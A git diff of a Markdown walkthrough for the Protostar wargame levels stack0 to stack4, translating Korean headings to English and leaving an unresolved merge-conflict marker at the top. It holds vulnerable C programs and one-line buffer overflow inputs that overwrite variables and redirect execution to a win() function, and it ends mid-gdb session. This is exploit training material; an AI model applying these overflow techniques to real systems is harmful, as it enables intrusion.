@@ -1,13 +1,23 @@
+<<<<<<< HEAD
 ### 설치 방법
   
 > * protostar vm on parallels
 > * root/godmod and ifconfig
+=======
+## Wargame/Protostar
 
-### Stack0
+## VM Configuration
+>>>>>>> 395bbcff115b2d8e185bfc323c9ef149ab077038
+
+- protostar vm (parallels, vmware, vmplayer, ...)
+- Login as admin id `root/godmod` and check IP using `ifconfig`
+- ssh `user@ip`, password : `user`
+
+## Stack0
 
 > /opt/protostar/bin/stack0
 
-```
+```c
 #include <stdlib.h>
 #include <unistd.h>
 #include <stdio.h>
@@ -28,18 +38,22 @@ int main(int argc, char **argv)
 }
 ```
 
-알아야하는 것 : *parameter passing to gets()*, *order of local parameters on the stack*, *command line python script* 
+### You should know 
 
-```
+- parameter passing to `gets()`
+- order of local parameters on the stack
+- command line python script
+
+```bash
 $ (python -c 'print "A"*64+"BBBB"';cat)|./stack0
 you have changed the 'modified' variable
 ```
 
-### Stack1
+## Stack1
 
 > /opt/protostar/bin/stack1
 
-```
+```c
 #include <stdlib.h>
 #include <unistd.h>
 #include <stdio.h>
@@ -65,18 +79,20 @@ int main(int argc, char **argv)
 }
 ```
 
-알아야하는 것 : *endian in memory*
+### You should know 
 
-```
+- endian in memory
+
+```bash
 $ ./stack1 `python -c 'print "A"*64+"\x64\x63\x62\x61"'`
 you have correctly got the variable to the right value
 ```
 
-### Stack2
+## Stack2
 
 > /opt/protostar/bin/stack2
 
-```
+```c
 #include <stdlib.h>
 #include <unistd.h>
 #include <stdio.h>
@@ -107,20 +123,23 @@ int main(int argc, char **argv)
 }
 ```
 
-알아야하는 것 : *shell variable*, *env variable*
+### You should know 
 
-```
+- shell variable
+- env variable
+
+```bash
 $ GREENIE=`python -c 'print "A"*64+"\x0a\x0d\x0a\x0d"'`
 $ export GREENIE
 $ ./stack2
 you have correctly modified the variable
 ```
 
-### Stack3
+## Stack3
 
 > /opt/protostar/bin/stack3
 
-```
+```c
 #include <stdlib.h>
 #include <unistd.h>
 #include <stdio.h>
@@ -147,9 +166,12 @@ int main(int argc, char **argv)
 }
 ```
 
-알아야하는 것 : *getting address of the function*, *objdump*
+### You should know 
 
-```
+- getting address of the function
+- `objdump`
+
+```bash
 $ objdump -d ./stack3 | grep win
 08048424 <win>:
 $ (python -c 'print "A"*64+"\x24\x84\x04\x08"';cat)|./stack3
@@ -157,11 +179,11 @@ calling function pointer, jumping to 0x08048424
 code flow successfully changed
 ```
 
-### Stack4
+## Stack4
 
 > /opt/protostar/bin/stack4
 
-```
+```c
 #include <stdlib.h>
 #include <unistd.h>
 #include <stdio.h>
@@ -180,9 +202,13 @@ int main(int argc, char **argv)
 }
 ```
 
-알아야하는 것 : *gdb*, *make eip value modified*, *assembly lea    0x10(%esp),%eax*
+### You should know 
 
-```
+- `gdb`
+- make eip value modified
+- assembly : `lea    0x10(%esp),%eax`
+
+```bash
 $ scp user@10.211.55.5:/opt/protostar/bin/stack4 .
 
 gef➤  x/64x $esp
